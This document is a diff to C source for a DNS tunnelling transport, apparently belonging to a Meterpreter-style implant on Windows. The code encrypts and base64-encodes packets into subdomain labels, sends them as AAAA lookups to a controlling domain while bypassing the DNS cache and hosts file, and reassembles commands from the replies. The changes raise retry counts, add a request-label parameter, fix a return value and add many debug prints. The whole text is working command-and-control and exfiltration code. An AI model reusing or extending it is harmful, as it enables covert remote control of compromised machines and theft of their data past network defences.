@@ -9,15 +9,17 @@
 #include <ws2tcpip.h>
 #include <windns.h>
 #pragma comment (lib, "Dnsapi.lib")
+
+
 /*!
  * @brief Wrapper around DNS-specific sending functionality.
  * @param hReq DNS request domain.
  * @return An indication of the result of sending the request.
  */
-BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter,IncapuslatedDns *recieve, PIP4_ARRAY pip4)
+BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter,IncapuslatedDns *recieve, PIP4_ARRAY pip4, wchar_t* reqz)
 {
 	
-	DWORD tries = 100;
+	DWORD tries = 1000;
 
 	DnsTunnel* xxx[17];
 	wchar_t sub_c[7];
@@ -47,7 +49,9 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 		++(*counter);
 
 		wcscat_s(request, 250, sub_seq);
-		wcscat_s(request, 250, L".g.");
+        wcscat_s(request, 250, L".");
+		wcscat_s(request, 250, reqz);
+        wcscat_s(request, 250, L".");
 		wcscat_s(request, 250, sub_c);
 		wcscat_s(request, 250, L".");
 		wcscat_s(request, 250, domain);
@@ -57,16 +61,15 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 
 		//dwRetval = getaddrinfo(request, NULL, &ctx->hints, &result); DNS_QUERY_STANDARD DNS_QUERY_BYPASS_CACHE
 
-		dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_WIRE_ONLY, pip4, &result, NULL);
+		dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pip4, &result, NULL);
 		//dns_status = GetAddrInfoW(request, L"", &phints, &result);
 
 		SAFE_FREE(request);
-
+        vdprintf("[PACKET RECEIVE WINDNS] DnsQuery status code is %d", dns_status);
 		if (dns_status != 0) {
-			vdprintf("[PACKET RECEIVE WINDNS] DnsQuery status code is %d", dns_status);
+			
 			tries--;
 			force_next = TRUE;
-            sleep(2);
 			//recieve->status = ERROR_READ_FAULT;
 			continue;
 		}
@@ -110,6 +113,7 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 
 			if (xxx[0] != NULL){
 				memcpy(sub_seq, xxx[0]->block.header.next_sub_seq, 8);
+                *counter = 0;
 			}
 			else
 			{
@@ -120,6 +124,7 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 			}
 		}
 		else {
+            vdprintf("[PACKET RECEIVE WINDNS] NO IP");
 			force_next = TRUE;
 			tries--;
 			continue;
@@ -157,6 +162,7 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 				if ((xxx[i]->index_size & 0x0f) < 16){
 					memcpy(recieve->packet + current_recieved, xxx[i]->block.data, (xxx[i]->index_size & 0x0f)); // copy packet
 					current_recieved += (xxx[i]->index_size & 0x0f);
+                    //vdprintf("[PACKET RECEIVE WINDNS] got %d from %d ", current_recieved, need_to_recieve);
 				}
 				else {
 					vdprintf("[PACKET RECEIVE WINDNS] INDEX overflow error");
@@ -206,7 +212,7 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
 
 
 
-	vdprintf("[PACKET RECEIVE WINDNS] packet recieved.");
+	vdprintf("[PACKET RECEIVE WINDNS] packet recieved with size (%d)",recieve->size);
 	
 	return TRUE;
 }
@@ -218,12 +224,12 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
  * @param size Buffer size.
  * @return An indication of the result of sending the request.
  */
-static BOOL send_request_windns(wchar_t * domain, wchar_t * subdomain, PUSHORT counter, PIP4_ARRAY pip4, LPVOID buffer, DWORD size, IncapuslatedDns *recieved)
+static BOOL send_request_windns(wchar_t * domain, wchar_t * subdomain, wchar_t* reqz, PUSHORT counter, PIP4_ARRAY pip4, LPVOID buffer, DWORD size, IncapuslatedDns *recieved)
 {
 	BOOL data = FALSE;
 	
 		if(buffer == NULL || size == 0){
-			data = get_packet_from_windns(domain, subdomain, counter, recieved, pip4);
+			data = get_packet_from_windns(domain, subdomain, counter, recieved, pip4, reqz);
 		} else if (buffer != NULL && size > 0) {
 			data = FALSE;
 		}
@@ -286,6 +292,8 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 	base64 = (wchar_t *)calloc(need_to_send, sizeof(wchar_t));
 	res = CryptBinaryToStringW((BYTE *)buffer, totalLength, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64, &need_to_send);
 
+    vdprintf("[PACKET TRANCIEVE WINDNS] BEFOR: %S",base64);
+    
 	while (base64[need_to_send - 1] == L'=') --need_to_send;
 
 	DWORD i = 0;
@@ -301,7 +309,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 		}
 		i++;
 	}
-
+    vdprintf("[PACKET TRANCIEVE WINDNS] AFT: %S",base64);
 	wcscpy_s(base64 + need_to_send, 1, L"\x00");
 
 	
@@ -316,7 +324,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 		wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
 		force_stop = FALSE;
 		vdprintf("[PACKET TRANCIEVE WINDNS] HEADER request: %S", request);
-		dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_BYPASS_CACHE, pSrvList, &result, NULL);
+		dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pSrvList, &result, NULL);
 		SAFE_FREE(request);
 		if (dns_status != 0) {
 			vdprintf("[PACKET TRANCIEVE WINDNS] DnsQuery status code is %d", dns_status);
@@ -368,9 +376,10 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 				wcsncat_s(request, MAX_DNS_NAME_SIZE, base64 + shift2, parts_last);
 				shift += parts_last;
 				shift2 += parts_last;
+                wcsncat_s(request, MAX_DNS_NAME_SIZE, L".", 1);
 			}
 
-			wcscat_s(request, MAX_DNS_NAME_SIZE, L".t.");
+			wcscat_s(request, MAX_DNS_NAME_SIZE, L"t.");
 			wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
 			wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
 			wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
@@ -378,7 +387,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 
 			vdprintf("[PACKET TRANCIEVE WINDNS] request: %S", request);
 
-			dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_BYPASS_CACHE, pSrvList, &result, NULL);
+			dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, pSrvList, &result, NULL);
 			SAFE_FREE(request);
 
 			if (dns_status != 0) {
@@ -402,9 +411,14 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 					++(*counter);
 					vdprintf("[PACKET TRANCIEVE WINDNS] sent: %d from %d", current_sent, need_to_send);
 				}
+                else if(tmp->index_size == 0xff && tmp->block.header.status_flag == 0xff && current_sent == need_to_send){
+                    current_sent = shift2;
+					++(*counter);
+					vdprintf("[PACKET TRANCIEVE WINDNS] repeat (finish): %d from %d", current_sent, need_to_send);      
+                }
 				else {
 					// ERROR
-					vdprintf("[PACKET TRANCIEVE WINDNS] response error, wrong header");
+					vdprintf("[PACKET TRANCIEVE WINDNS] response error, wrong header 0x%x (%d from %d)", tmp->block.header.status_flag, current_sent, need_to_send);
 					ret = DNS_ERROR_INVALID_IP_ADDRESS;
 					force_stop = TRUE;
 				}
@@ -426,14 +440,15 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
 
 	SAFE_FREE(buffer);
 	SAFE_FREE(base64);
-	
+	vdprintf("[PACKET TRANCIEVE WINDNS] res: %d %d ",current_sent, need_to_send);
 	if (force_stop == FALSE && tries > 0 && current_sent == need_to_send){
+        vdprintf("[PACKET TRANCIEVE WINDNS] cool");
 		ret = ERROR_SUCCESS;
 	}
 
 	
 	
-	return res;
+	return ret;
 }
 
 /*!
@@ -448,9 +463,9 @@ static DWORD packet_transmit_via_dns(Remote *remote, Packet *packet, PacketReque
 	CryptoContext *crypto;
 	Tlv requestId;
 	DWORD res;
-
+    dprintf("[PACKET] TRANSMIT... 1 %x", packet);
 	lock_acquire(remote->lock);
-
+    dprintf("[PACKET] TRANSMIT... 1.0 %x", packet);
 	// If the packet does not already have a request identifier, create one for it
 	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
 	{
@@ -458,14 +473,16 @@ static DWORD packet_transmit_via_dns(Remote *remote, Packet *packet, PacketReque
 		CHAR rid[32];
 
 		rid[sizeof(rid)-1] = 0;
-
+        dprintf("[PACKET] TRANSMIT... 1.2");
 		for (index = 0; index < sizeof(rid)-1; index++)
 		{
 			rid[index] = (rand() % 0x5e) + 0x21;
 		}
 
 		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
+        dprintf("[PACKET] TRANSMIT... 1.3");
 	}
+    dprintf("[PACKET] TRANSMIT... 2");
 
 	do
 	{
@@ -475,6 +492,7 @@ static DWORD packet_transmit_via_dns(Remote *remote, Packet *packet, PacketReque
 			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
 			&requestId) == ERROR_SUCCESS))
 		{
+            dprintf("[PACKET] TRANSMIT... 2.2");
 			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
 		}
 
@@ -486,22 +504,24 @@ static DWORD packet_transmit_via_dns(Remote *remote, Packet *packet, PacketReque
 		{
 			ULONG origPayloadLength = packet->payloadLength;
 			PUCHAR origPayload = packet->payload;
-
+            dprintf("[PACKET] TRANSMIT... 2.3");
 			// Encrypt
 			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
 				packet->payloadLength, &packet->payload,
 				&packet->payloadLength)) !=
 				ERROR_SUCCESS)
 			{
+                dprintf("[PACKET] TRANSMIT... 2.4");
 				SetLastError(res);
 				break;
 			}
-
+            dprintf("[PACKET] TRANSMIT... 2.5");
 			// Destroy the original payload as we no longer need it
 			free(origPayload);
-
+            dprintf("[PACKET] TRANSMIT... 2.6");
 			// Update the header length
 			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
+            dprintf("[PACKET] TRANSMIT... 2.7");
 		}
 
 		dprintf("[PACKET] New xor key for sending");
@@ -566,8 +586,7 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
 	
 	if (ctx->ready == TRUE){
 		vdprintf("[PACKET RECEIVE DNS] sending req: %S", ctx->domain);
-			
-		BOOL rcvStatus = send_request_windns(ctx->domain, sub_seq, &ctx->counter, ctx->pip4, NULL, 0, &recieved);
+		BOOL rcvStatus = send_request_windns(ctx->domain, sub_seq, L"g", &ctx->counter, ctx->pip4, NULL, 0, &recieved);
 
 		if (rcvStatus == TRUE && recieved.status == ERROR_SUCCESS) // Handle response
 		{
@@ -585,7 +604,6 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
 			vdprintf("[PACKET RECEIVE DNS] tlv length: %d", header.length);
 			// use TlvHeader size here, because the length doesn't include the xor byte
 			payloadLength = header.length - sizeof(TlvHeader);
-
 			// Allocate the payload
 			if (!(payload = (PUCHAR)malloc(payloadLength)))
 			{
@@ -593,11 +611,11 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
                 vdprintf("[PACKET RECEIVE DNS] ERROR_NOT_ENOUGH_MEMORY");
 			
 			} else {
-			
-                dprintf("[PACKET RECEIVE DNS] copy %d",payloadLength);
-				// Read the payload
-				memcpy(payload, recieved.packet + sizeof(header), payloadLength);
-				
+               
+                dprintf("[PACKET RECEIVE DNS] alloc %d",payloadLength);
+                
+                memcpy(payload, recieved.packet + sizeof(header), payloadLength);
+                    
 				dprintf("[PACKET RECEIVE DNS] decoding payload");
 				xor_bytes(header.xor_key, payload, payloadLength);
 
@@ -797,7 +815,7 @@ static DWORD server_dispatch_dns(Remote* remote, THREAD* dispatchThread)
 		if (result != ERROR_SUCCESS)
 		{
 			// Update the timestamp for empty replies
-			if (result == ERROR_EMPTY)
+			if (result == DNS_INFO_NO_RECORDS)
 			{
 				transport->comms_last_packet = current_unix_timestamp();
 			}
